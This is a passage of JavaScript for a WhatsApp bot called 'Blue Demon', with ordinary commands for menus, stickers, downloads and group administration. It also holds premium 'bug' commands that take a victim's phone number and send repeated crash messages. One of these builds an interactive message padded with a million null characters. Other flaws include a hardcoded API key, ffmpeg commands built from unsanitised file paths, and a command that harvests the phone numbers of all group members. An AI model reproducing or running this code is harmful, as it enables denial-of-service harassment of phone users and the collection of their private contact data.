    // Button and Menu Structure
    let mainMenu = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            newsletterName: "By BlueDemon",
                            serverMessageId: 1,
                        },
                    },
                    header: {
                        title: " *•𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽 𝚁𝙴𝙼𝙸𝚇 𝙼𝙴𝙽𝚄*",
                        ...(await prepareWAMessageMedia(
                            { image: menuImage },  // Send the image as a buffer
                            { upload: deltacrashgcinc.waUploadToServer } 
                        )),
                        hasMediaAttachment: true,
                    },
                    body: {
                        text: `${manhwa}\nᴄʜᴏᴏꜱᴇ ᴀ ᴄᴏᴍᴍᴀɴᴅ ʙᴇʟᴏᴡ`,
                    },
                    footer: {
                        text: "𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: `{
                                    "title": " ALL MENU ",
                                    "sections": [
                                        {
                                            "title": "💕ꜱᴇʟᴇᴄᴛ ʏᴏᴜʀ ᴄᴏᴍᴍᴀɴᴅ💕",
                                            "highlight_label": "ᴅᴇᴍᴏɴ ᴛᴇᴄʜ",
                                            "rows": [
                                                {
                                                    "header": "💕• MAINMENU💕",
                                                    "title": "😁ꜱʜᴏᴡ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ",
                                                    "id": "menu2"
                                                },
                                                {
                                                    "header": "🧣ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴏᴡɴᴇʀ",
                                                    "title": "👋ᴅɪꜱᴘʟᴀʏꜱ ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ",
                                                    "id": ".owner"
                                                },
                                                {
                                                    "header": "🖥️ - BOT INFO",
                                                    "title": "👾ᴅɪꜱᴘʟᴀʏꜱ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ʙᴏᴛ",
                                                    "id": ".bmenu"
                                                }
                                            ]
                                        },
                                        {
                                            "title": " 💕ꜱᴜᴘᴇʀɪᴏʀ ᴄᴏᴍᴍᴀɴᴅ💕 ",
                                            "highlight_label": "ᴅᴇᴍᴏɴ ᴛᴇᴄʜ",
                                            "rows": [
                                                {
                                                    "header": "💀 - BUG MENU",
                                                    "title": "😱ᴅɪꜱᴘʟᴀʏꜱ ᴀʟʟ ʙᴜɢ ᴄᴏᴍᴍᴀɴᴅꜱ",
                                                    "id": ".bugmenu"
                                                },
                                                {
                                                    "header": "🥶 - PANEL MENU",
                                                    "title": "😎ᴅɪꜱᴘʟᴀʏꜱ ᴘᴀɴᴇʟ ᴄᴏᴍᴍᴀɴᴅꜱ",
                                                    "id": ".panelmenu"
                                                }
                                            ]
                                        }
                                    ]
                                }`
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: `{
                                    "display_text": "JOIN CHANNEL",
                                    "url": "https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h",
                                    "merchant_url": "https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h"
                                }`
                            }
                        ],
                        messageParamsJson: "",
                    },
                },
            },
        },
    };

    // Sending the structured menu based on your bot's configuration
    await deltacrashgcinc.relayMessage(m.chat, mainMenu, {});
    break;
}
const emojis = [
    '❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', 
    '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', 
    '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋'
];

// Listen to every incoming message
if (global.autoreaction && !m.key.fromMe) {  // Ensure auto-reaction is enabled and not responding to itself
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];  // Pick a random emoji
    try {
        await deltacrashgcinc.sendMessage(m.chat, {
            react: {
                text: randomEmoji,  // Reaction emoji
                key: m.key  // React to the current message
            }
        });
    } catch (err) {
        console.error('Failed to send reaction:', err);
    }
}
case 'autoreaction': {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);

    if (!args[0]) return deltacrashrevolutionReply(`Usage: ${prefix + command} on/off`);

    if (args[0] === 'on') {
        global.autoreaction = true;  // Enable autoreaction globally
        deltacrashrevolutionReply(`Auto-reaction is now enabled`);
    } else if (args[0] === 'off') {
        global.autoreaction = false;  // Disable autoreaction globally
        deltacrashrevolutionReply(`Auto-reaction is now disabled`);
    } else {
        deltacrashrevolutionReply(`Invalid option. Usage: ${prefix + command} on/off`);
    }
    break;
}
const maxLocationLength = 100; // Set a limit for the location message length

case 'message': {
    if (m.message && m.message.locationMessage) {
        const locationMsg = m.message.locationMessage;

        // Check if the location message is suspicious (e.g., too long)
        if (locationMsg && locationMsg.degreesLatitude.length > maxLocationLength) {
            await deltacrashgcinc.sendMessage(m.chat, {
                text: `⚠️ Bug detected! Removing the location message from @${m.sender.split('@')[0]}.`,
                mentions: [m.sender]
            });

            // Delete the message to prevent a bug
            await deltacrashgcinc.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant || m.participant
                }
            });

            // Optional: Warn or kick the user (for groups)
            if (m.isGroup && m.isBotAdmin) {
                deltacrashgcinc.sendMessage(m.chat, {
                    text: `@${m.sender.split('@')[0]}, sending location bugs is not allowed! This is a warning.`,
                    mentions: [m.sender]
                });

                // Optionally kick the user after warning
                // await deltacrashgcinc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
            }
        }
    }
    break;
}
const spamProtection = {};
const spamThreshold = 5; // Message limit before considering it spam
const timeFrame = 10000; // Time in milliseconds (10 seconds)

case 'message': {
    const userId = m.sender; // The sender's ID
    const currentTime = new Date().getTime();

    // Initialize user's spam protection if not already done
    if (!spamProtection[userId]) {
        spamProtection[userId] = {
            messages: 1,
            firstMessageTime: currentTime
        };
    } else {
        // Check if the user is sending messages too fast
        const timeElapsed = currentTime - spamProtection[userId].firstMessageTime;

        if (timeElapsed < timeFrame) {
            spamProtection[userId].messages += 1;

            if (spamProtection[userId].messages >= spamThreshold) {
                // Detected spam, mute or block the user
                deltacrashgcinc.sendMessage(m.chat, {
                    text: `⚠️ @${userId.split('@')[0]} is sending too many messages too quickly!`,
                    mentions: [userId]
                });

                // Apply a penalty (e.g., mute or block)
                if (m.isGroup && m.isBotAdmin) {
                    await deltacrashgcinc.groupParticipantsUpdate(m.chat, [userId], 'mute'); // Mute in group
                } else {
                    await deltacrashgcinc.updateBlockStatus(userId, 'block'); // Block in private chat
                }

                // Reset the user's spam protection
                delete spamProtection[userId];
            }
        } else {
            // Reset the user's message count if the time frame has passed
            spamProtection[userId].messages = 1;
            spamProtection[userId].firstMessageTime = currentTime;
        }
    }
    break;
}
case 'meki': 
case 'anjay':  
case 'arara': {
    if (!isPremium) return deltacrashrevolutionReply(mess.premium); // Check if the user is premium
    if (!text) return deltacrashrevolutionReply(`Example: .${command} 628xxx`); // Prompt for usage

    let peler = q.replace(/[^0-9]/g, ""); // Clean the input to only numbers
    if (peler.startsWith('0')) return deltacrashrevolutionReply(`\`[ # ]\` Enter the initial country code\n\n\`[ # ]\` Example: .${command} 628xxx`);

    let Pe = peler + '@s.whatsapp.net'; // Prepare WhatsApp ID
    await deltacrashrevolutionReply(mess.bugrespon); // Send response message

    for (let j = 0; j < 5; j++) { // Loop to send messages multiple times
        await locationcrash(Pe);
        await sendMultiplePaymentInvites(Pe);
        await locationcrash(Pe, zynxzobug);
        await listfuck(Pe, oneclick);
        await sendExtendedTextMessage(Pe, force);
        await blackening(Pe, force2);
        await sendPaymentInfoMessage(Pe);
        await locationcrash(Pe, force);

        // Send repeated message
        await deltacrashgcinc.sendMessage(Pe, { text: `\`𝘜𝘵𝘢𝘮𝘢𝘬𝘢𝘯 𝘍𝘶𝘯𝘨𝘴𝘪 𝘋𝘦𝘤𝘬\`` }, { quoted: m });
        await sleep(500); // Sleep for 0.5 seconds between messages
    }
    
    await sendPaymentInfoMessage(Pe, force2); // Send payment info
    await bakdok(Pe, zynxzobug); // Execute the bakdok function
    await listfuck(Pe); // List the specified function
    await sendMultiplePaymentInvites(Pe, force); // Send payment invites
    await locationcrash(Pe, zynbug); // Crash location
    await sendPaymentInfoMessage(Pe, zynxzobug); // Send payment info again

    await deltacrashrevolutionReply(mess.donebug); // Send completion message
    break; // End of case
}
case 'beta-new': 
case 'wa-ori':  
case 'wa-busins': 
case 'wa-mod': {
    if (!isPremium) return deltacrashrevolutionReply(mess.premium);
    if (!text) return deltacrashrevolutionReply(`Usage .${command} 6281234567890`);

    let peler = q.replace(/[^0-9]/g, '');  // Clean up the input to only keep numbers
    if (peler.startsWith('0')) return deltacrashrevolutionReply(`Example: ${prefix + command} 6281234567890`);

    var contactInfo = await deltacrashgcinc.onWhatsApp(peler + "@s.whatsapp.net");
    let whatsappNumber = peler + '@s.whatsapp.net';

    // Block specific numbers
    if (['916909137213', '919366316008', '919402104403'].includes(peler)) {
        return;  // Return without any action if the number matches the restricted ones
    }

    // Check if the number is registered on WhatsApp
    if (contactInfo.length === 0) {
        return deltacrashrevolutionReply("The number is not registered on WhatsApp.");
    }

    // Function to send the "ZYNXZO CRASH WHATSAPP" message 10 times
    async function sendSystemCrashMessage(jid) {
        for (let i = 0; i < 10; i++) {  // Repeat 10 times
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'header': {
                                'title': '',
                                'subtitle': " "
                            },
                            'body': {
                                'text': "TO MAKE BUG NO EASY O"
                            },
                            'footer': {
                                'text': '🙃'
                            },
                            'nativeFlowMessage': {
                                'buttons': [{
                                    'name': 'cta_url',
                                    'buttonParamsJson': "{ display_text : 'Zynxzo', url : , merchant_url :  }"
                                }],
                                'messageParamsJson': "\0".repeat(1000000)
                            }
                        }
                    }
                }
            }), {
                'userJid': jid
            });
            await deltacrashgcinc.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });

            // Add a small delay between each message to prevent flooding
            await new Promise(resolve => setTimeout(resolve, 1000));  // 1-second delay
        }
    }

    // Send the BugPay message to the specified WhatsApp number 10 times
    await sendSystemCrashMessage(whatsappNumber);

    // Send a message confirming the action and mentioning the target user
    deltacrashgcinc.sendMessage(m.chat, {
        text: `Successfully sent Bug to @${whatsappNumber.split('@')[0]} using *${command}* ✅\n\nPause 2 minutes to avoid bot ban.`,
        mentions: [whatsappNumber]
    });

    break;
}
case 'take': {
    if (!m.quoted) return deltacrashrevolutionReply(`Reply to a sticker with caption *${prefix + command}* to change its name.`);
    
    // Ensure the quoted message is a sticker
    if (!/webp/.test(mime)) return deltacrashrevolutionReply('Please reply to a valid sticker.');
    
    // Prompt the user for the new sticker name
    let newPackName = args[0] || "ʙʟᴜᴇ ᴅᴇᴍᴏɴ ᴛᴇᴄʜ💕";  // Use default name if none is provided
    let newAuthor = args[1] || "ᴅᴇᴍᴏɴ x ᴠɪᴘ";   // Use default author if none is provided
    
    try {
        // Download the sticker media
        let media = await deltacrashgcinc.downloadMediaMessage(m.quoted);
        
        // Convert the media to a buffer for modification
        let stickerData = await deltacrashgcinc.downloadAndSaveMediaMessage(m.quoted);
        
        // Define the options to modify the sticker metadata
        let options = {
            packname: newPackName,
            author: newAuthor
        };
        
        // Convert the sticker and update metadata
        await deltacrashgcinc.sendImageAsSticker(m.chat, stickerData, m, options);
        
        // Remove the downloaded media to free up space
        fs.unlinkSync(stickerData);

        // No feedback after the success

    } catch (err) {
        console.error(err);
        deltacrashrevolutionReply('Error changing sticker name.');
    }
    
    break;
}
case 'demoteall': {
    if (!m.isGroup) return deltacrashrevolutionReply(mess.group); // Ensure it's in a group chat
    if (!isCreator) return deltacrashrevolutionReply(mess.admin); // Check if the user is the group creator
    if (!isBotAdmins) return deltacrashrevolutionReply(mess.botAdmin); // Ensure the bot is an admin

    // Get all participants except the bot and the owner
    const demoteAll = groupMetadata.participants
        .filter(participant => participant.id !== botNumber && participant.id !== `${ownernumber}@s.whatsapp.net`)
        .map(participant => participant.id);

    // Demote all admins
    for (let userId of demoteAll) {
        await deltacrashgcinc.groupParticipantsUpdate(m.chat, [userId], 'demote');
        await sleep(100); // Sleep for 100ms between each demotion
    }

    // Send success message
    deltacrashrevolutionReply('Successfully demoted all admins.');
    break;
}
case 'promoteall': {
    if (!m.isGroup) return deltacrashrevolutionReply(mess.group); // Ensure it's in a group chat
    if (!isCreator) return deltacrashrevolutionReply(mess.admin); // Check if the user is the group creator
    if (!isBotAdmins) return deltacrashrevolutionReply(mess.botAdmin); // Ensure the bot is an admin

    // Get all participants except the bot and the owner
    const promoteAll = groupMetadata.participants
        .filter(participant => participant.id !== botNumber && participant.id !== `${ownernumber}@s.whatsapp.net`)
        .map(participant => participant.id);

    // Promote all members
    for (let userId of promoteAll) {
        await deltacrashgcinc.groupParticipantsUpdate(m.chat, [userId], 'promote');
        await sleep(100); // Sleep for 100ms between each promote
    }

    // Send success message
    deltacrashrevolutionReply('Successfully promoted all members.');
    break;
}
case 'save': {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);
    
    try {
        // Check if the command is replying to a status (image or video)
        if (!m.quoted || (m.quoted.mtype !== 'imageMessage' && m.quoted.mtype !== 'videoMessage')) {
            return deltacrashrevolutionReply('Please reply to an image or video status.');
        }
        
        // Download the quoted status (image or video)
        const media = await deltacrashgcinc.downloadMediaMessage(m.quoted);
        
        // Save the downloaded status to a specific folder with a timestamped filename
        const fileType = m.quoted.mtype === 'imageMessage' ? 'jpg' : 'mp4';
        const fileName = `./downloads/status_${new Date().getTime()}.${fileType}`;
        fs.writeFileSync(fileName, media);
        
        // Reply with the saved status (image or video)
        await deltacrashgcinc.sendMessage(m.chat, {
            [m.quoted.mtype === 'imageMessage' ? 'image' : 'video']: { url: fileName },
            caption: `Here is the saved status!`
        }, { quoted: m });
        
        // Clean up and delete the file after sending
        fs.unlinkSync(fileName);
        
    } catch (err) {
        console.error(err);
        deltacrashrevolutionReply('Failed to save and send the status. Please try again.');
    }
    
    break;
}
case 'unmute': {
    // Check if the command is being used in a group
    if (!m.isGroup) return deltacrashrevolutionReply(mess.group);
    
    // Check if the user is an admin or the creator of the bot
    if (!isAdmins && !isCreator) return deltacrashrevolutionReply(mess.admin);
    
    // Check if the bot has admin rights
    if (!isBotAdmins) return deltacrashrevolutionReply(mess.botAdmin);

    try {
        // Unmute the group (everyone can send messages)
        await deltacrashgcinc.groupSettingUpdate(m.chat, 'not_announcement');
        deltacrashrevolutionReply('ᴜɴᴍᴜᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ .');
    } catch (err) {
        console.error(err);
        deltacrashrevolutionReply('Failed to unmute the group. Please try again.');
    }

    break;
}
case 'mute': {
    // Check if the command is being used in a group
    if (!m.isGroup) return deltacrashrevolutionReply(mess.group);
    
    // Check if the user is an admin or the creator of the bot
    if (!isAdmins && !isCreator) return deltacrashrevolutionReply(mess.admin);
    
    // Check if the bot has admin rights
    if (!isBotAdmins) return deltacrashrevolutionReply(mess.botAdmin);

    try {
        // Mute the group (only admins can send messages)
        await deltacrashgcinc.groupSettingUpdate(m.chat, 'announcement');
        deltacrashrevolutionReply('ᴍᴜᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ');
    } catch (err) {
        console.error(err);
        deltacrashrevolutionReply('Failed to mute the group. Please try again.');
    }

    break;
}
case 'tiktok': {
    if (!text) return deltacrashrevolutionReply('Please provide a TikTok video URL.');

    // Regex to match different TikTok URL formats and extract the video ID
    const videoIdMatch = text.match(/(?:video\/|\/v\/|tiktok\.com\/)(\d+)/);

    if (!videoIdMatch || videoIdMatch.length < 2) {
        return deltacrashrevolutionReply('Invalid TikTok URL. Please make sure it contains a valid video ID.');
    }
    
    const videoIdExtracted = videoIdMatch[1]; // Extracted video ID from the URL

    deltacrashrevolutionReply('Fetching video... Please wait.');

    const https = require('https');

    const options = {
        method: 'GET',
        hostname: 'tiktok-scraper7.p.rapidapi.com',
        port: null,
        path: `/video?video_id=${videoIdExtracted}`, // Insert extracted video ID here
        headers: {
            'x-rapidapi-key': '8039da5b96msh06ec92a5b5b06bep1e07c9jsn86b2a752eed3', // Replace with your valid RapidAPI key
            'x-rapidapi-host': 'tiktok-scraper7.p.rapidapi.com'
        }
    };

    const req = https.request(options, function (res) {
        const chunks = [];

        res.on('data', function (chunk) {
            chunks.push(chunk);
        });

        res.on('end', function () {
            const body = Buffer.concat(chunks);
            let jsonResponse;

            try {
                jsonResponse = JSON.parse(body.toString()); // Parse the response as JSON
            } catch (err) {
                return deltacrashrevolutionReply('Failed to parse TikTok video data. Please try again.');
            }

            if (!jsonResponse || !jsonResponse.data || !jsonResponse.data.video_url) {
                return deltacrashrevolutionReply('Failed to retrieve the TikTok video. Please check the video URL.');
            }

            // Send the video URL back to the user
            deltacrashgcinc.sendMessage(m.chat, {
                video: { url: jsonResponse.data.video_url },
                caption: `Downloaded from TikTok\n*Title*: ${jsonResponse.data.title || 'No title available'}`
            }, { quoted: m });
        });
    });

    req.on('error', function (e) {
        console.error(e);
        deltacrashrevolutionReply('Error fetching TikTok video.');
    });

    req.end();
    break;
}
case 'svcontact': {
    if (!m.isGroup) return; // No response if not in a group
    if (!isCreator) return; // Only the group creator can use this command

    // Fetch group metadata
    let groupMetadata = await deltacrashgcinc.groupMetadata(m.chat);
    let participants = groupMetadata.participants;
    let groupName = groupMetadata.subject; // Get group name

    // Prepare an empty vCard content
    let vcfContent = '';

    // Loop through each participant and add them to the vCard format
    participants.forEach(participant => {
        let phoneNumber = participant.id.split('@')[0]; // Extract phone number
        vcfContent += `BEGIN:VCARD\nVERSION:3.0\nFN:[BLUE] ${phoneNumber}\nTEL;type=CELL;type=VOICE;waid=${phoneNumber}:+${phoneNumber}\nEND:VCARD\n\n`;
    });

    // Save the vCard content to a file
    const filePath = './contacts.vcf';
    fs.writeFileSync(filePath, vcfContent, 'utf8');

    // Send the vCard file to the group with "by ʙʟᴜᴇxᴅᴇᴍᴏɴ" in the file name
    await deltacrashgcinc.sendMessage(m.chat, {
        document: { url: filePath },
        fileName: `${groupName}_contacts_by_ʙʟᴜᴇxᴅᴇᴍᴏɴ.vcf`, // Include group name and "by ʙʟᴜᴇxᴅᴇᴍᴏɴ"
        mimetype: 'text/vcard'
    }, { quoted: m });

    // Clean up the temporary vCard file after sending
    fs.unlinkSync(filePath);
    break;
}
const exec = require('child_process').exec;

async function webpToMp4Fallback(media, outputPath) {
    return new Promise((resolve, reject) => {
        exec(`ffmpeg -i ${media} ${outputPath}`, (err) => {
            if (err) {
                reject(err);
            } else {
                resolve(outputPath);
            }
        });
    });
}

// Usage inside the case
case 'tomp4':
case 'tovideo': {
    if (!/webp/.test(mime)) return deltacrashrevolutionReply(`Reply to a sticker with caption *${prefix + command}*`);
    
    deltacrashrevolutionReply(mess.wait);
    
    try {
        // Download the media (sticker)
        let media = await deltacrashgcinc.downloadAndSaveMediaMessage(m.quoted);
        let outputFileName = getRandom('.mp4'); // Generate a random name for the output file

        // Use FFmpeg to convert WebP to MP4
        exec(`ffmpeg -i ${media} ${outputFileName}`, async (err) => {
            if (err) {
                console.error(err);
                deltacrashrevolutionReply('Error converting WebP to MP4.');
                return;
            }

            // Send the converted MP4 video
            await deltacrashgcinc.sendMessage(m.chat, {
                video: fs.readFileSync(outputFileName),
                caption: 'Converted WebP to Video'
            }, { quoted: m });

            // Clean up: delete the downloaded and converted files
            fs.unlinkSync(media);
            fs.unlinkSync(outputFileName);
        });

    } catch (err) {
        console.error(err);
        deltacrashrevolutionReply('Error processing the sticker.');
    }
    break;
}
case 'toaud':
case 'toaudio': {
    if (!/video/.test(mime) && !/audio/.test(mime)) 
        return deltacrashrevolutionReply(`Send/Reply Video/Audio that you want to convert to audio with caption ${prefix + command}`);
    
    deltacrashrevolutionReply(mess.wait);

    try {
        let media = await deltacrashgcinc.downloadMediaMessage(m.quoted);
        let audio = await toAudio(media, 'mp4'); // Assuming you have this helper function
        await deltacrashgcinc.sendMessage(m.chat, {
            audio: audio,
            mimetype: 'audio/mpeg'
        }, { quoted: m });
    } catch (err) {
        console.error(err);
        deltacrashrevolutionReply('Error converting media to audio.');
    }
    break;
}
case "setppbot": {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner); // Only allow bot creator
    if (m.quoted) {
        try {
            // Download the quoted media
            const media = await deltacrashgcinc.downloadAndSaveMediaMessage(m.quoted);
            
            // Generate profile picture data
            const { img } = await generateProfilePicture(media);
            
            // Set the bot profile picture
            await deltacrashgcinc.query({
                tag: "iq",
                attrs: {
                    to: botNumber,
                    type: "set",
                    xmlns: "w:profile:picture",
                },
                content: [
                    {
                        tag: "picture",
                        attrs: { type: "image" },
                        content: img,
                    },
                ],
            });
            
            deltacrashrevolutionReply(`${mess.success}`);
        } catch (error) {
            console.error(error);
            deltacrashrevolutionReply("Failed to set profile picture.");
        }
    } else {
        deltacrashrevolutionReply("Reply to an image to set as profile picture.");
    }
    break;
}
case "toimage":
case "toimg": 
case "img": {
    if (!/webp/.test(mime)) 
        return deltacrashrevolutionReply(`Reply to a sticker with the caption *${prefix + command}*`);
    
    deltacrashrevolutionReply(mess.wait);
    
    try {
        // Download the sticker media
        let media = await deltacrashgcinc.downloadAndSaveMediaMessage(quoted);
        let ran = getRandom('.png');
        
        // Convert webp to png using ffmpeg
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media); // Remove the original media file
            if (err) return deltacrashrevolutionReply('An error occurred while converting the image.');
            
            // Read the output image and send it as a response
            let buffer = fs.readFileSync(ran);
            deltacrashgcinc.sendMessage(m.chat, {
                image: buffer,
                caption: 'Here is your image!'
            }, { quoted: m });
            
            // Remove the temporary file
            fs.unlinkSync(ran);
        });
    } catch (error) {
        console.error(error);
        deltacrashrevolutionReply('Failed to convert the sticker to image.');
    }
}
break;

if (autoswview) {
    // Fetch the list of statuses
    let statusList = await deltacrashgcinc.fetchStatusUpdates();
    for (let status of statusList) {
        // Automatically view each status
        await deltacrashgcinc.readStatus(status.id);
    }
}
case 'avs':
case 'autoviewstatus': {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);
    if (!q) return deltacrashrevolutionReply('ᴜꜱᴀɢᴇ: ᴏɴ/ᴏꜰꜰ');

    if (q === 'on') {
        autoswview = true;
        deltacrashrevolutionReply(`ᴀᴜᴛᴏᴠɪᴇᴡꜱᴛᴀᴛᴜꜱ ʜᴀꜱ ʙᴇᴇɴ ᴇɴᴀʙʟᴇᴅ.`);
    } else if (q === 'off') {
        autoswview = false;
        deltacrashrevolutionReply(`ᴀᴜᴛᴏᴠɪᴇᴡꜱᴛᴀᴛᴜꜱ ʜᴀꜱ ʙᴇᴇɴ ᴇɴᴀʙʟᴇᴅ.`);
    } else {
        deltacrashrevolutionReply('ɪɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ. ᴜꜱᴇ "ᴏɴ" ᴏʀ "ᴏꜰꜰ".');
    }

    break;
}

case 'youtube': {
    if (!text) return deltacrashrevolutionReply('Please provide a YouTube link.');
    
    let youtubeUrl = text;
    
    if (!ytdl.validateURL(youtubeUrl)) {
        return deltacrashrevolutionReply('Invalid YouTube URL. Please provide a valid link.');
    }

    try {
        let info = await ytdl.getInfo(youtubeUrl);
        let audioFormat = ytdl.filterFormats(info.formats, 'audioonly')[0];

        let downloadPath = path.join(__dirname, `./downloads/${info.videoDetails.title}.mp3`);

        // Download the audio and save it to the downloads folder
        ytdl(youtubeUrl, { filter: 'audioonly' })
            .pipe(fs.createWriteStream(downloadPath))
            .on('finish', () => {
                deltacrashrevolutionReply(`Downloaded: ${info.videoDetails.title}. Check the downloads folder.`);
            })
            .on('error', (error) => {
                console.error(error);
                deltacrashrevolutionReply('Failed to download the audio. Please try again.');
            });

    } catch (error) {
        console.error(error);
        deltacrashrevolutionReply('An error occurred. Please check the URL or try again later.');
    }

    break;
}
            case 'listblock': {
    // Check if the user is the creator or a premium user
    if (!isCreator && !isPremium) {
        return deltacrashrevolutionReply("You do not have the required permissions to use this command.");
    }

    try {
        // Fetch the blocklist from your setup
        let block = await deltacrashgcinc.fetchBlocklist();

        // Prepare the message showing the number of blocked users and their details
        let blockMessage = `*List of Blocked Users*:\n\n` +
                           `Total: ${block == undefined || block.length === 0 ? '*0* blocked' : '*' + block.length + '* blocked'}\n` +
                           block.map(v => '么 ' + v.replace(/@.+/, '')).join('\n');

        // Send the blocklist as a reply
        deltacrashrevolutionReply(blockMessage);
    } catch (error) {
        // Handle any errors, e.g., if fetching the blocklist fails
        deltacrashrevolutionReply("Failed to retrieve the blocklist.");
    }
    break;
}
       case 'buypanel':
       case 'ipanel': {
    deltacrashrevolutionReply(`Available panels for sale
Dm me +2348131084833
▬▭▬▭▬▭▬▭▬▭▬▭
📮 𝙍𝘼𝙈 1 𝙂𝘽 30% 𝘾𝙋𝙐 
📮 𝙍𝘼𝙈 2 𝙂𝘽 50% 𝘾𝙋𝙐
📮 𝙍𝘼𝙈 3 𝙂𝘽 70% 𝘾𝙋𝙐 
📮 𝙍𝘼𝙈 4 𝙂𝘽 100% 𝘾𝙋𝙐 
📮 𝙍𝘼𝙈 5 𝙂𝘽 120% 𝘾𝙋𝙐
📮 𝙍𝘼𝙈 6 𝙂𝘽 140% 𝘾𝙋𝙐
📮 𝙍𝘼𝙈 7 𝙂𝘽 160% 𝘾𝙋𝙐
📮 𝙍𝘼𝙈 8 𝙂𝘽 180% *cpu*
📮 𝙍𝘼𝙈 9 𝙂𝘽 200% 𝘾𝙋𝙐
📮 𝙍𝘼𝙈 10 𝙂𝘽 220% *cpu*`);
    break;
}     
            case 'hrt': case 'love': {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);

    // Array of heart emojis to send one by one
    const heartEmojis = [
        '♥️', '❣️', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '❤️‍🔥', 
        '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💕', 
        '🫀', '💓', '💝', '💞', '💓', '💘', '💗', '💝', '💓'
    ];

    // Send the initial message
    const loveMsg = await deltacrashgcinc.sendMessage(m.chat, { text: heartEmojis[0] }, { quoted: m });

    // Function to update the message with new emojis
    const updateMessage = async (index = 1) => {
        if (index < heartEmojis.length) {
            await deltacrashgcinc.relayMessage(m.chat, {
                protocolMessage: {
                    key: loveMsg.key,
                    type: 14,
                    editedMessage: {
                        conversation: heartEmojis[index]
                    }
                }
            }, {});

            // Schedule the next update after 2 seconds
            setTimeout(() => updateMessage(index + 1), 1000);
        }
    };

    // Start updating the message with heart emojis one by one
    setTimeout(() => updateMessage(), 1000);
    break;
}
case 'angry': 
case 'gtf': {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);

    // Array of angry-themed stickers/emojis to send one by one
    const angryEmojis = [
        '😡', '😠', '🤬', '👿', '💢', '🔥', '😾', '😤', '🤯', '💥',
        '😾', '👺', '👊', '🗯️', '😒', '👎', '🥵', '🧨', '👹', '💣',
        '😠', '👊', '💥', '😡', '🤬', '🔥', '💢'
    ];

    // Send the initial angry emoji
    const angryMsg = await deltacrashgcinc.sendMessage(m.chat, { text: angryEmojis[0] }, { quoted: m });

    // Function to update the message with new emojis/stickers
    const updateMessage = async (index = 1) => {
        if (index < angryEmojis.length) {
            await deltacrashgcinc.relayMessage(m.chat, {
                protocolMessage: {
                    key: angryMsg.key,
                    type: 14,
                    editedMessage: {
                        conversation: angryEmojis[index]
                    }
                }
            }, {});

            // Schedule the next update after 2 seconds
            setTimeout(() => updateMessage(index + 1), 1000);
        }
    };

    // Start updating the message with angry emojis/stickers one by one
    setTimeout(() => updateMessage(), 1000);
    break;
}
case 'confuse':
case 'conf': {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);

    // Array of confused-themed emojis to send one by one
    const confusedEmojis = [
        '😕', '🤔', '😵', '😵‍💫', '🤷', '🤷‍♂️', '🤷‍♀️', '😮‍💨', '😐', '🤨', 
        '🙃', '😬', '😯', '😖', '😑', '😳', '🤪', '🤯'
    ];

    // Send the initial confused emoji
    const confuseMsg = await deltacrashgcinc.sendMessage(m.chat, { text: confusedEmojis[0] }, { quoted: m });

    // Function to update the message with new confused emojis
    const updateMessage = async (index = 1) => {
        if (index < confusedEmojis.length) {
            await deltacrashgcinc.relayMessage(m.chat, {
                protocolMessage: {
                    key: confuseMsg.key,
                    type: 14,
                    editedMessage: {
                        conversation: confusedEmojis[index]
                    }
                }
            }, {});

            // Schedule the next update after 2 seconds
            setTimeout(() => updateMessage(index + 1), 1000);
        }
    };

    // Start updating the message with confused emojis one by one
    setTimeout(() => updateMessage(), 1000);
    break;
}
case 'promote': {
    // Check if the command is being used in a group
    if (!m.isGroup) return deltacrashrevolutionReply('ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ɪɴ ɢʀᴏᴜᴘꜱ.');
    
    // Check if the bot is an admin
    if (!isBotAdmins) return deltacrashrevolutionReply('ᴛʜᴇ ʙᴏᴛ ɴᴇᴇᴅꜱ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.');

    // Check if the user issuing the command is an admin
